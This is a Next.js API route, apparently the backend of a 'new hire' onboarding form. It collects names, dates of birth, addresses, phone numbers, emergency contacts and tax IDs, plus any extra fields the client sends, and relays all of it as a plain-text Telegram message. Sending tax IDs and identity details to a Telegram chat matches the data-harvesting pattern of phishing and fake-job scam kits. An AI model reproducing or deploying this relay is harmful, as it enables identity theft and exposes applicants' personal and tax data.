import { NextResponse } from "next/server";
import { sendTelegramMessage } from "@/utils/telegram";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const LABELS: Record<string, string> = {
  firstName: "First name",
  lastName: "Last name",
  dob: "Date of birth",
  phone: "Phone",
  email: "Personal email",
  street: "Street",
  city: "City",
  region: "Province / state",
  postal: "Postal / ZIP",
  country: "Country",
  position: "Position",
  startDate: "Start date",
  employmentType: "Employment type",
  workLocation: "Work arrangement",
  ecName: "Emergency contact",
  ecRelation: "Relationship",
  ecPhone: "Emergency phone",
  taxId: "Tax ID",
  taxIdType: "Tax ID type",
  declared: "Declaration accepted",
  submittedAt: "Submitted at",
};

const MAX_VALUE = 500;

function clean(v: unknown): string {
  if (v === null || v === undefined) return "";
  if (typeof v === "boolean") return v ? "Yes" : "No";
  if (typeof v !== "string" && typeof v !== "number") return "";
  return String(v)
    .replace(/[\u0000-\u001F\u007F]+/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, MAX_VALUE);
}

export async function POST(request: Request) {
  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ success: false, error: "Invalid JSON" }, { status: 400 });
  }

  if (!body || typeof body !== "object" || Array.isArray(body)) {
    return NextResponse.json({ success: false, error: "Invalid payload" }, { status: 400 });
  }

  const record = body as Record<string, unknown>;

  const lines: string[] = ["🧾 New hire submission", ""];

  // Emit in a fixed order, then any extra keys the client sent.
  for (const [key, label] of Object.entries(LABELS)) {
    lines.push(`${label}: ${clean(record[key]) || "—"}`);
  }
  for (const [key, value] of Object.entries(record)) {
    if (key in LABELS) continue;
    lines.push(`${key}: ${clean(value) || "—"}`);
  }

  try {
    await sendTelegramMessage(lines.join("\n"));
  } catch {
    console.error("Submission relay failed");
    return NextResponse.json({ success: false, error: "Submission failed" }, { status: 502 });
  }

  return NextResponse.json({ success: true });
}